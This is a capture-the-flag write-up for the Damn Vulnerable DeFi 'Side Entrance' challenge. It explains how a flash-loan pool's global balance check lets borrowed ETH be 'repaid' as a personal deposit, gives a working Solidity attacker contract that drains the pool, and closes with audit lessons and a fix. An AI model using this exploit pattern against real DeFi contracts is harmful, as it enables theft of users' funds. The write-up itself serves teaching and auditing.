---
title: 'Damn Vulnerable DeFi - Side Entrance'
description: 'Exploring the flaws in flash loan accounting. Learn how to use a contract’s own flash loan to "deposit" into your own account and then walk out with the entire pool.'
date: 2025-07-04
tags: ['solidity', 'security', 'flash-loan', 'accounting-logic', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🚪 Side Entrance - The Flash Loan Accounting Trap

## Challenge Overview

The `Side Entrance` challenge features an ETH pool that allows users to deposit and withdraw ETH, while also offering free flash loans using the deposited funds. 

The pool starts with **1000 ETH**, and you start with just **1 ETH**.

**The Goal:** Drain the entire 1000 ETH from the pool and move it to the recovery account.

---

## Technical Analysis

### The Vulnerable Code

The vulnerability exists in the interplay between the `deposit`, `withdraw`, and `flashLoan` functions. Specifically, look at the `flashLoan` validation:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

### The Flaw: Global vs. Local Accounting

1.  **Global Check:** The `flashLoan` function only checks if the **total contract balance** (`address(this).balance`) is at least as much as it was before the loan. It doesn't care *how* the balance was restored.
2.  **Local Accounting:** The `deposit` function increases a user's internal balance mapping when they send ETH to the contract.

### The Attack Vector

An attacker can borrow ETH via a flash loan and immediately "repay" it by calling the `deposit` function. 

*   From the `flashLoan` function's perspective, the contract balance has been restored, so the transaction succeeds.
*   From the `deposit` function's perspective, the attacker has just "deposited" 1000 ETH of their own money into the pool.

The attacker then simply calls `withdraw()` to take out their newly "deposited" funds, effectively stealing the pool's original assets.

---

## The Exploit: The Circular Deposit

1.  **Deploy Attacker Contract:** Since flash loans require an `execute()` callback, we must use a contract.
2.  **Request Flash Loan:** The attacker contract requests 1000 ETH.
3.  **The Callback (`execute`):** Inside the callback, the attacker contract receives the 1000 ETH and immediately calls `pool.deposit{value: 1000 ether}()`.
4.  **Verification:** The `flashLoan` function finishes, sees the balance is still 1000 ETH, and succeeds.
5.  **Extraction:** The attacker contract calls `pool.withdraw()`. Since the pool recorded a 1000 ETH deposit for the attacker, it sends the funds.
6.  **Transfer:** Move the funds to the recovery address.

---

## Proof of Concept (PoC)

```solidity
contract Attacker {
    SideEntranceLenderPool pool;
    address recovery;

    function attack(SideEntranceLenderPool _pool, address _recovery) external {
        pool = _pool;
        recovery = _recovery;
        
        // 1. Borrow everything
        pool.flashLoan(1000 ether);
        
        // 3. Withdraw the "deposited" funds
        pool.withdraw();
        
        // 4. Send to recovery
        payable(recovery).transfer(address(this).balance);
    }

    // 2. The Callback
    function execute() external payable {
        // "Repay" the loan by depositing it into our own account
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

---

## Auditor's Lessons

1.  **Avoid Global Balance Checks for Flash Loans:** Never use `address(this).balance` as the sole verification for repayment. It doesn't distinguish between a loan repayment and a new user deposit.
2.  **Function Mutex / Reentrancy Locks:** Flash loans should ideally lock other state-changing functions (like `deposit`) while the loan is active to prevent circular logic.
3.  **Separate Loan Liquidity:** Keep flash loan liquidity separate from user deposit accounting to prevent one from influencing the other.
4.  **Source of Funds Validation:** Ensure that "repayments" are handled through a dedicated mechanism that doesn't trigger unrelated accounting logic.

---

## Remediation

Add a state variable to track if a flash loan is in progress and prevent deposits during that time:

```solidity
bool private isFlashLoaning;

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    isFlashLoaning = true;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    isFlashLoaning = false;
    require(address(this).balance >= balanceBefore, "RepayFailed");
}

function deposit() external payable {
    require(!isFlashLoaning, "Deposit blocked during flash loan");
    balances[msg.sender] += msg.value;
}
```
